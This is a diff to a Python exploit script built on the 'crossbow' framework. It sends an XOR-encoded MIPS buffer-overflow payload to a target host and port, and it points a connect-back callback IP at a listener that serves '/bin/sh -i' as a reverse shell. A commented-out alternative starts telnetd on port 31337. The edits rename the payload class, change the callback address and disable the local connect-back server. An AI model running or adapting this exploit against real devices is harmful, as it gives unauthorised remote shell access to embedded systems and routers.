@@ -20,12 +20,12 @@ from crossbow.overflow_development.overflowbuilder import OverflowBuffer,Section
 from crossbow.common.support import LittleEndian,Logging
 from crossbow.servers import ConnectbackHost
 from crossbow.servers.callback_server import ConnectbackServer
-from crossbow.payloads.mips.callback_payload import CallbackPayload
+from crossbow.payloads.mips.connectback_payload import ConnectbackPayload
 from crossbow.encoders.mips import MipsXorEncoder
 #from crossbow.encoders.mips import MipsUpperAlphaEncoder
 logger=Logging()
 
-CALLBACK_IP="192.168.1.4"
+CALLBACK_IP="192.168.1.2"
 CALLBACK_PORT="8080"
 
 qemu=False
@@ -79,7 +79,7 @@ connectback_server=ConnectbackServer(connectback_host,startcmd="/bin/sh -i")
 #Or non-interactive exploitation:
 #connectback_server=ConnectbackServer(connectback_host,startcmd="/usr/sbin/telnetd -p 31337",connectback_shell=False)
 
-payload=CallbackPayload(connectback_host,LittleEndian)
+payload=ConnectbackPayload(connectback_host,LittleEndian)
 
 encoded_payload=MipsXorEncoder(payload,LittleEndian,badchars=badchars)
 #encoded_payload=MipsUpperAlphaEncoder(payload,LittleEndian,badchars=badchars)
@@ -103,14 +103,13 @@ if len(sys.argv) == 2:
         print "Found value %s at\noffset: %d" % (search_value,offset)
     exit(0)
 
-
-pid=None
-pid=connectback_server.serve_connectback()
+addr=sys.argv[1]
+port=int(sys.argv[2])
+pid=1
+#pid=connectback_server.serve_connectback()
 time.sleep(1)
 if pid and pid > 0:
     try:
-        addr=sys.argv[1]
-        port=int(sys.argv[2])
 
         sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
@@ -118,9 +117,10 @@ if pid and pid > 0:
         print("sending exploit.")
         sock.send(str(buf))
         sock.close()
+        sys.exit(0)
         connectback_server.wait()
-    except:
-
+    except Exception as e:
+        print e
         print("Failed to connect. Killing connect-back server.")
         os.kill(pid,signal.SIGTERM)
 
